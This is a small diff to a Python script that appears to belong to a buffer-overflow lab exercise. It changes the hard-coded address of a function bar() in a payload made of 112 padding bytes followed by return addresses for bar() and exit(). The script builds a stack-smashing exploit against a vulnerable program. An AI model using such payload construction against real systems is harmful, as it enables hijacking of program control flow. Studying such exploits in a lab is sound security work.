@@ -4,7 +4,7 @@ import sys
 def tobytes (value):
    return (value).to_bytes(4,byteorder='little')
 
-bar_addr   = 0x08048567  # Address of bar()
+bar_addr   = 0x08048582  # Address of bar()
 exit_addr  = 0xb7e369d0  # Address of exit()
 
 content = bytearray(0xaa for i in range(112))
